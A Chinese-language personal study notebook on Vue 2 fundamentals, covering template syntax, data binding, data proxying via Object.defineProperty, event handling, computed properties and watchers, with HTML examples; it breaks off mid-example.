# 1. Vue基础知识和原理

## 1.1 初识Vue

​	Vue是一套用于**构建用户页面**的**渐进式**JavaScript框架

​	![image-20230225111825583](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230225111825583.png)

## 1.2 谁开发的

![image-20230225112521513](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230225112521513.png)

## 1.3 Vue的特点

1. 采用**组件化**模式，提高代码复用率、且让代码更好的维护

![image-20230225112828963](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230225112828963.png)

2. **声明式**编码，让编码人员无需直接操作DOM，提高开发效率

![image-20230225113156793](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230225113156793.png)

3. 使用**虚拟DOM**+优秀的**Diffing算法**，尽量复用DOM节点

## 1.4 学习Vue之前要掌握的JavaScript基础知识

```
ES6语法规范、ES6模块化、包管理器、原型，原型链、数组常用方法、axios、promise...
```

## 1.5 Hello小案例

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
1. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
1. root容器里的代码被称为【Vue模板】
1. Vue示例和容器是一一对应的
1. 真实开发中只有一个Vue实例，并且会配合着组件一起使用
1. `{{xxx}}`中的`xxx`要写js表达式，且`xxx`可以自动读取到`data`中的所有属性
1. 一旦`data`中的数据发生改变，那么页面中用到该数据的地方也会自动更新

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>初识Vue</title>
    <!-- 引入Vue -->
    <script src="../01-初识Vue/js/vue.js"></script>
</head>
<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 插值语法 -->
        <h1>Hello,{{name}}</h1>
    </div>
    <script>
        Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示
        // 创建Vue实例
        new Vue({
            // element 找到id为root的容器
            el: '#root',  //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
            data: { // data中用于存储数据，数据供el所指定的容器所使用，值我们暂时先写成一个对象
                name: 'czq'
            },
        })

    </script>
</body>
</html>
```

![image-20230228194722006](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230228194722006.png)

​	注意区分js表达式和js代码（语句）

		1. 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方

​		（1）a

​		（2）a+b

​		（3）demo(1)

​		（4）x === y ? 'a' : 'b'

2. js代码（语句）

​		（1）if(){}

​		（2）for(){}

## 1.6 模板语法

### 	Vue模板语法有2大类：

1. 插值语法：

   功能：用于解析标签体内容

   写法：`{{xxx}}`，`xxx`是js表达式，且可以直接读取到`data`中的所有属性

2. 指令语法：

   功能：用于解析标签（包括标签属性、标签体内容、绑定事件......）

   举例：`v-bind:href='xxx'`或简写为`:href='xxx'`,`xxx`同样要写js表达式，且可以直接读取到`data`中的所有属性

   备注：Vue中有很多的指令，且形式都是`v-xxx`，此处我们只是拿`v-bind`举例子

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>模板语法</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好，{{name}}</h3>
        <hr/>
        <h1>指令语法</h1>
        <a v-bind:href="school.url" v-bind:x="hello">点我去{{school.name}}1</a>
        <a :href="url.toUpperCase()" :x="hello">点我去百度2</a>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'abcabc',
                url: "http://www.baidu.com",
                hello: '真的逊',
                school: {
                    name: '大学',
                    url: 'http://www.4399.com'
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230228210057056](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230228210057056.png)

## 1.7 数据绑定

​	Vue中有2种数据绑定的方式：

​		（1）单向绑定（v-bind）：数据只能从`data`流向`页面`

​		（2）双向绑定（v-model）：数据不仅能从`data`流向`页面`，还可以从`页面`流向`data`

​			备注：

					1. 双向绑定一般都应用在表单类元素上（如：`input`、`select`等）
					1. `v-model:value`可以简写为`v-model`，因为`v-model`默认收集的就是`value`值

```vue
<!-- 如下代码是错误的。因为v-model只能应用在表单类元素（输入类元素）上 -->
<h2 v-model:x="name">真的逊</h2>
```

示例代码：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>数据绑定</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 普通写法 -->
        <!-- 单向数据绑定：<input type="text" name="" id="" v-bind:value="name">
        <br/>
        双向数据绑定：<input type="text" name="" id="" v-model:value="name"> -->
        <br/>
        <!-- 简写 -->
        单向数据绑定：<input type="text" name="" id="" :value="name">
        <br/>
        双向数据绑定：<input type="text" name="" id="" v-model="name">


        <!-- 如下代码是错误的。因为v-model只能应用在表单类元素（输入类元素）上 -->
        <!-- <h2 v-model:x="name">真的逊</h2> -->
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'czq'
            }
        })
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230302195541061.png" alt="image-20230302195541061" style="zoom:50%;" />

## 1.8 el与data的两种写法

 1. el有2种写法

    	1. new Vue的时候配置el属性
        	2. 先创建Vue实例，然后通过`vm.$mount('#root')`指定el的值

 2. data有2种写法

    	1. 对象式
        	2. 函数式

    如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则就会报错

 3. 一个重要的原则：

​		由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了

​	el的两种写法：

```javascript
        const v = new Vue({
            // el: '#root', // 第一种写法
            data: {
                name: 'abc'
            }
        })
        console.log(v);
        v.$mount('#root') // 第二种写法
```

​	data的两种写法：

​		对象式：

```javascript
new Vue({
		el: '#root',
		data: {
				name: 'czq',
		}
})
```

​	函数式：

```javascript
new Vue({
		el: '#root',
		data: function(){ //省略写法：data(){}
				console.log(this) //此处的this是Vue实例对象
		// 必须要返回一个对象
				return {
						name: 'czq'
				}
		}
})
```

​	整体程序：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>el与data的两种写法</title>
    <script src="../js/vue.js"></script>
    <!-- 容器 -->
    <div id="root">
        <h1>你好,{{name}}</h1>
    </div>
</head>
<body>
    <script>
        // el的两种写法
        // const v = new Vue({
        //     // el: '#root', // 第一种写法
        //     data: {
        //         name: 'abc'
        //     }
        // })
        // console.log(v);
        // v.$mount('#root') // 第二种写法

        // data的两种写法
        new Vue({
            el: '#root',
            // data的第一种写法：对象式
            // data: {
            //     name: 'czq',
            // }
            // data的第二种写法：函数式
            data: function(){ //省略写法：data(){}
                console.log(this); //此处的this是Vue实例对象
                return {
                    name: 'czq'
                }
            }
        })
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303143047502.png" alt="image-20230303143047502" style="zoom:50%;" />

## 1.9 MVVM模型

	1. M：模型（Model）：对应data中的数据
	1. V：视图（View）：模板
	1. VM：视图模型（ViewModel）：Vue实例对象	

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303183500434.png" alt="image-20230303183500434" style="zoom:50%;" />

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>理解MVVM</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>学校名称:{{name}}</h1>
        <h1>学校地址:{{address}}</h1>
        <h1>test:{{$options}}</h1>
        <h1>tets2:{{$emit}}</h1>
        <h1>test4:{{_c}}</h1>
    </div>

    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'fly school',
                address: 'China'
            }
        })
        console.log(vm);
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303185256955.png" alt="image-20230303185256955" style="zoom:50%;" />

​	观察发现：

1. data身上中所有的属性，最后都出现在了vm身上
2. vm身上以及Vue原型上的所有属性，在Vue模板中都可以直接使用

## 1.10 数据代理

### 1.10.1 学习Object.defineProperty方法

​	https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty

​	**`Object.defineProperty()`** 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象。

```javascript
Object.defineProperty(obj, prop, descriptor)


obj
要定义属性的对象。

prop
要定义或修改的属性的名称或 Symbol 。

descriptor
要定义或修改的属性描述符。
```

​	默认情况下，使用此方法添加进对象的属性不参与枚举 在Chrome浏览器显示的key为淡色（比如无法遍历到此属性的key和value）

​	下面的`Object.keys() ` 此方法传入一个对象作为参数，可以把传入对象里面所有属性的属性名提取出来变成一个数组

```javascript
        let person = {
            name: '陈正清',
            sex: '男',
            // age: 21
        }

        // 使用此方法添加进对象的属性不参与枚举 在Chrome浏览器显示的key为淡色（比如无法遍历到此属性的key和value）
        Object.defineProperty(person, 'age', {
            value: 18
        })
        // 验证：
        // Object.keys() 此方法传入一个对象作为参数，可以把传入对象里面所有属性的属性名提取出来变成一个数组
         console.log(Object.keys(person));
        console.log(person);
```

![image-20230303193347292](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303193347292.png)	

​	遍历出来的数组中没有名为`age`的元素 证明此属性未参与遍历

​	扩展：forin遍历对象

​		`forin`既能遍历数组又能遍历对象 其会逐一输出对象里面每一个属性的属性值

```javascript
        for(let key in person){
            // 输出person对象里面每一个属性的属性值
            console.log(person[key]);
        }
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303193748657.png" alt="image-20230303193748657" style="zoom:50%;" />

​	由此可见添加进去的age属性仍未参与遍历

​	**如需让添加进去的属性可遍历，则需要在添加的第三个参数加一个配置项：`enumerable`**

​	**如需让添加进去的属性可修改，则需要在添加的第三个参数加一个配置项：`writable`**

​	**如需让添加进去的属性可删除，则需要在添加的第三个参数加一个配置项：`configurable`**

```javascript
        let person = {
            name: '陈正清',
            sex: '男',
            // age: 21
        }

        // 使用此方法添加进对象的属性不参与枚举 在Chrome浏览器显示的key为淡色（比如无法遍历到此属性的key和value）
        Object.defineProperty(person, 'age', {
            value: 18,
            enumerable: true, //控制属性是否可以枚举，默认值是false
            writable: true, //控制属性是否可以被修改，默认值是false
            configurable: true //控制属性是否可以被删除，默认值是false
        })
```

​	新需求：person对象新加的属性将会读取全局变量number  对象的value随number的变化而变化

```javascript
        let number = 18
        let person = {
            name: '陈正清',
            sex: '男',
            // age: 21
        }

        Object.defineProperty(person, 'age', {
            //value: 18,

            // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
            get: function(){
                return number
            }
        })
```

 调试结果

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303200438784.png" alt="image-20230303200438784" style="zoom:50%;" />

​	另外还有setter方法 由于此对象中 age的value是来自于变量number 的 则在最后需要将number的值进行绑定

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>回顾Object.defineProperty方法</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <script>
        let number = 19
        let person = {
            name: '陈正清',
            sex: '男',
            // age: 21
        }

        // 使用此方法添加进对象的属性不参与枚举 在Chrome浏览器显示的key为淡色（比如无法遍历到此属性的key和value）
        Object.defineProperty(person, 'age', {
            // value: 18,
            // enumerable: true, //控制属性是否可以枚举，默认值是false
            // writable: true, //控制属性是否可以被修改，默认值是false
            // configurable: true //控制属性是否可以被删除，默认值是false

            // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
            get: function(){
                console.log('有人读取age属性了');
                return number
            },
            // 当有人读取person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
            set: function(value){
                console.log('有人修改了age属性，且值是:' + value);
                number = value
            }
        })
        // 验证：
        // Object.keys() 此方法传入一个对象作为参数，可以把传入对象里面所有属性的属性名提取出来变成一个数组
        // console.log(Object.keys(person));

        // forin既能遍历数组又能遍历对象
        // for(let key in person){
        //     // 输出person对象里面每一个属性的属性值
        //     console.log(person[key]);
        // }
        console.log(person);
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303201307991.png" alt="image-20230303201307991" style="zoom:50%;" />

### 1.10.2 何为数据代理

​	数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

```javascript
        let obj = {
            x: 100,
        }
        let obj2 = {
            y: 200,
        }
        Object.defineProperty(obj2, 'x', {
            get(){
                return obj.x
            },
            set(value){
                obj.x = value
            }
        })
```

​	实现数据代理：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303202101924.png" alt="image-20230303202101924" style="zoom:50%;" />

### 1.10.3 Vue中的数据代理

 1. Vue中的数据代理:

    通过vm对象来代理data对象中属性的操作（读/写）

 2. Vue中数据代理的好处：

    更加方便的操作data中的数据

 3. 基本原理：

    通过`Object.defineProperty()`把data对象中所有的属性添加到vm上

    为每一个添加到vm上的属性，都指定一个getter/setter

    在getter/setter内部去操作（读/写）data中对应的属性

    ![image-20230303211232696](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303211232696.png)

​	![image-20230303203955212](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303203955212.png)

 这里要知道 我们Vue实例对象中的`data`和控制台里面的`_data`是一样的

`_data`里面做的是一个数据劫持，所以点开里面不是一个纯正的对象

​	注意：因为data我们写在了Vue实例对象里面，不是全局变量，则我们想了个办法把它放出来

```javascript
        const data =  {
                name: 'TsingHua',
                address: 'Beijing',
            }
        const vm = new Vue({
            el: '#root',
            data,
        })
        
```

![image-20230303205747989](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230303205747989.png)

​	这可以证明我们操作的data可以被Vue的getter和setter调用

## 1.11 事件处理

### 1.11.1 事件的基本使用

​	事件的基本使用：

		1. 使用`v-on:xxx` 或 `@xxx`绑定事件，其中`xxx`为事件名
		1. 事件的回调需要配置在`methods`对象中，最终会在`vm`上
		1. `methods`中配置的函数，不要用箭头函数！否则`this`就不是`vm`的了
		1. `methods`中配置的函数，都是被Vue所管理的函数，`this`的指向是`vm`或`组件实例对象`
		1. `@click='demo'`和`@click='demo($event)'`效果一致，但后者可以传参

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>事件的基本使用</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>欢迎来到{{name}}</h2>
        <!-- <button v-on:click="showInfo">点我提示信息</button> -->
        <button @click="showInfo1">点我提示信息1（不传参）</button>
        <button @click="showInfo2(66, $event)">点我提示信息2（传参）</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'HuBei'
            },
            methods: {
                showInfo1(e){
                    // console.log(this); //此处的this是vm
                    console.log('同学您好');
                },
                showInfo2(number, e){
                    // console.log('同学你好2');
                    console.log(number, e);
                }
            }
        })
        console.log(vm);
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230306163951680.png" alt="image-20230306163951680" style="zoom:50%;" />

### 1.11.2 事件修饰符

​	Vue中的事件修饰符：

		1. `prevent`：复制默认事件（常用）
		1. `stop`：阻止事件冒泡（常用）
		1. `once`：事件只触发一次（常用）
		1. `capture`：使用事件的捕获模式
		1. `self`：只有`event.target`是当前操作的元素才触发事件
		1. `passive`：事件的默认行为立即执行，无需等待事件回调执行完毕

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>事件修饰符</title>
    <script src="../js/vue.js"></script>
    <style>
        * {
            margin-top: 20px;
        }

        .demo1 {
            height: 50px;
            background-color: skyblue;
        }

        .box1 {
            padding: 5px;
            background-color: purple;
        }

        .box2 {
            padding: 5px;
            background-color: red;
        }

        .list {
            height: 200px;
            width: 200px;
            background-color: peru;
            overflow: auto;
        }

        li {
            height: 100px;
        }
    </style>
</head>

<body>
    <div id="root">
        <h2>欢迎来到{{name}}</h2>
        <!-- 阻止默认事件（常用） -->
        <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息1</a>

        <!-- 阻止事件冒泡（常用） -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">点我提示信息</button>
          	<!-- 链式编程 -->
            <!-- <button @click.stop.prevent="showInfo">点我提示信息</button> -->
        </div>

        <!-- 事件只触发一次（常用） -->
        <button @click.once="showInfo">点我提示信息</button>

        <!-- 使用事件的捕获模式 -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>

        <!-- self:只有event.target是当前操作的元素才触发事件 一定程度上也可以阻止冒泡 -->
        <div class="demo1" @click.self="showInfo">
            <button @click="showInfo">点我提示信息</button>
        </div>

        <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
        <ul @scroll="demo" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'HuBei'
            },
            methods: {
                showInfo(e) {
                    // e.preventDefault()
                    alert('同学您好')
                },
                showMsg(msg) {
                    console.log(msg);
                },
                demo(){
                    for(let i = 0; i < 10000; i++){
                        console.log('#');
                    }
                    console.log('累坏了');
                }
            }
        })
    </script>
</body>

</html>
```

### 1.11.3 键盘事件

 1. Vue中常用的按键别名：

    回车 => enter

    删除 => delete（捕获“删除 delete”和“退格键 ←”）

    退出 => esc

    空格 => space

    换行 => tab（特殊，必须配合keydown去使用）

    上 => up

    下 => down

    左 => left

    右 => right

 2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但要注意转为`kebab-case`（短横线命名）

 3. 系统修饰键（用法特殊）：`ctrl、alt、shift、meta`

    	1. 配合`keyup`使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
        	2. 配合`keydown`使用：正常触发事件

 4. 也可以使用`keyCode`去指定具体的案件（不推荐）

 5. `Vue.config.keyCodes.自定义键名 = 键码`，可以去定制按键别名

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>键盘事件</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>欢迎来到{{name}}</h2>
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
    </div>
    <script>
        Vue.config.keyCodes.huiche = 13
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'HuBei'
            },
            methods: {
                showInfo(e){
                    console.log(e.target.value);
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230306185814130](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230306185814130.png)

## 1.12 计算属性

	1. 定义：要用的属性不存在，要通过已有的属性计算得来
	1. 原理：底层借助了`Object.defineProperty()`方法提供的`getter`和`setter`
	3. get函数什么时候执行？
	 	1. 初次读取时会执行一次
	 	2. 当依赖的数据发生改变时会被再次调用
	1. 优势：与`methods`实现相比，内部会有缓存机制（复用），效率更高，测试方便
	5. 备注：
	 	1. 计算属性最终会出现在`vm`上，直接用`this`读取使用即可
	 	2. 如果计算属性要被修改，那必须写`setter`函数去相应修改，且set中要引起计算时依赖的数据发生改变

在这个说明案例中，有太多需要注意的点，我们可以发现使用计算属性更利于性能节省以及调试方便

1. 插值语法实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>姓名案例_插值语法实现</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName"> <br/>
        名：<input type="text" v-model="lastName"> <br/>
        全名：<span>{{firstName.slice(0, 3) + '-' + lastName}}</span>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                firstName: '张',
                lastName: '三'
            }
        })
    </script>
</body>
</html>
```

![image-20230306202717232](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230306202717232.png)

2. 用methods实现

​	如果页面上有n个需要展示的地方，则methods对应的函数会调用n次，不利于性能节约

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>姓名案例_methods实现</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName"> <br/>
        名：<input type="text" v-model="lastName"> <br/>
        全名：<span>{{fullName()}}</span>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                firstName: '张',
                lastName: '三'
            },
            methods: {
                fullName(){
                    return this.firstName + '-' + this.lastName
                }
            }
        })
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230306202930528.png" alt="image-20230306202930528" style="zoom:50%;" />

3. 计算属性实现以及简写

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>姓名案例_计算属性实现</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName"> <br/>
        名：<input type="text" v-model="lastName"> <br/>
        全名：<span>{{fullName}}</span>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                firstName: '张',
                lastName: '三'
            },
            computed: {
                fullName: {
                    // get有什么作用？当有人读取fullName时，get就会被调用且返回值就作为fullName的值
                    // get什么时候调用？ 1.初次读取fullName时。 2.所依赖的数据发生变化时
                    get(){
                        console.log(this); // 此处的this是vm
                        return this.firstName + '-' + this.lastName
                    },

                    // set什么时候调用？当fullName被修改时
                    set(value){
                        const arr = value.split('-')
                        this.firstName = arr[0]
                        this.lastName = arr[1]
                    }
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230306203022576](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230306203022576.png)

​	**注意：当我们的计算属性不需要进行修改，而只是展示在页面上时，则可以触发简写方式，将计算属性直接当成其`getter()`使用**

```javascript
computed: {
  fullname(){
    console.log(this)
    return this.firstName + '-' + 'lastName'
  }
}
```

## 1.13 监视属性

### 1.13.1 天气案例

​	用前面学过的只知识来写天气案例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>天气案例</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot"></button> -->
        <button @click="changeWeather">切换天气</button>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
            computed: {
                info(){
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
        })
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307162129309.png" alt="image-20230307162129309" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307162147550.png" alt="image-20230307162147550" style="zoom:50%;" />

### 1.13.2 监视属性写天气案例

​	监视属性`watch`：

	1. 当监视的属性变化时，回调函数自动调用，进行相关操作
	1. 监视的属性必须存在，才能进行监视！！
	3. 监视的两种写法：
	 	1. `new Vue`时传入`watch`配置
	 	2. 通过`vm.$watch`监视

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>天气案例_监视属性</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            watch: {
                isHot: {
                    // 初始化时让handler调用一下
                    immediate: true,
                    // handler函数什么时候调用？ 当isHot发生改变时
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue);
                    },

                }
            }
        })
        // 也可以在配置对象外面进行监视
        // 如果在创建Vue实例的时候就想好了监视谁，则可以用上面的写法
        // vm.$watch('isHot', {
        //     // 初始化时让handler调用一下
        //     immediate: true,
        //     // handler函数什么时候调用？ 当isHot发生改变时
        //     handler(newValue, oldValue) {
        //         console.log('isHot被修改了', newValue, oldValue);
        //     },
        // })
    </script>
</body>

</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307164716568.png" alt="image-20230307164716568" style="zoom:50%;" />

### 1.13.3 深度监视

	1. Vue中的`watch`默认不监测对象内部值的改变（一层）
	1. 配置`deep: true`可以监测对象内部值改变（多层）

备注：

1. Vue自身可以监测对象内部值的改变，但Vue提供的`watch`默认不可以！
2. 使用`watch`时根据数据的具体结构，决定是否采用深度监视

**没有加deep进行深度监视之前：**

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>天气案例_深度监视</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
        <hr/>
        <h3>a的值是：{{numbers.a}}</h3>
        <button @click="addA">点我让a+1</button>
        <hr/>
        <h3>b的值是：{{numbers.b}}</h3>
        <button @click="addB">点我让b+1</button>
    </div>
    <script>
        
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                numbers: {
                    a: 1,
                    b: 1,
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                },
                addA(){
                    this.numbers.a++
                },
                addB(){
                    this.numbers.b++
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            watch: {
                isHot: {
                    // 初始化时让handler调用一下
                    // immediate: true,
                    // handler函数什么时候调用？ 当isHot发生改变时
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue);
                    },

                },
                // 监视多级结构中某个属性的变化
                'numbers.a': {
                    handler(){
                        console.log('a值改变了');
                    }
                },
                // 监视多级结构中所有属性的变化
                numbers: {
                    // deep: true,
                    handler(){
                        console.log('number发生改变了');
                    }
                }
            }
        })
    </script>
</body>

</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307172825480.png" alt="image-20230307172825480" style="zoom:50%;" />

​	这里可以看出，number里面的a和b都发生了改变，没有引起监视里的handle函数执行

**加deep进行深度监视之后：**

```javascript
            watch: {
                // 监视多级结构中某个属性的变化
                'numbers.a': {
                    handler(){
                        console.log('a值改变了');
                    }
                },
                // 监视多级结构中所有属性的变化
                numbers: {
                    deep: true,
                    handler(){
                        console.log('number发生改变了');
                    }
                }
            }
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307173047187.png" alt="image-20230307173047187" style="zoom:50%;" />

这里可以看到已经引起了handler函数执行

### 1.13.4 监视属性的简写

**写在Vue实例对象内：**

​	完整写法：

```javascript
            watch: {
                // 完整写法：
                isHot: {
                    // 初始化时让handler调用一下
                    immediate: true,
                    deep: true, //深度监视
                    // handler函数什么时候调用？ 当isHot发生改变时
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue);
                    },
                },
            }
```

​	当且仅当我们需要监视的属性里面只需要用到handler函数时，就可以用到我们的简写方式，与上面的计算属性简写类似

```
watch{
		//简写
		isHot(newValue, oldValue){
				console.log('isHot被修改了', newValue, oldValue)
		}
}
```

**写在Vue实例对象外：**

```javascript
				// 完整写法
        vm.$watch('isHot', {
            immediate: true,
            deep: true,
            handler(newValue, oldValue){
                console.log('isHot被修改了', newValue, oldValue);
            }
        })
```

​	简写：

```javascript
        // 简写：
        vm.$watch('isHot', function(newValue, oldValue){
            console.log('isHot被修改了', newValue, oldValue);
        })
```

### 1.13.5 computed与watch之间的区别

	1. `computed`能完成的功能，`watch`都可以完成
	1. `watch`能完成的功能，`computed`不一定能完成，例如：`watch`可以进行异步操作

两个重要的小原则：

	1. 所有被Vue所管理的函数，最好写成普通函数，这样`this`的只想才是`vm`或`组件实例对象`
	1. 所有不被Vue所管理的函数（如定时器的回调函数、ajax的回调函数、Promise的回调函数等），最好写成箭头函数，这样`this`的指向才是`vm`或`组件实例对象`

**watch实现：**

```html
        姓：<input type="text" v-model="firstName"> <br/>
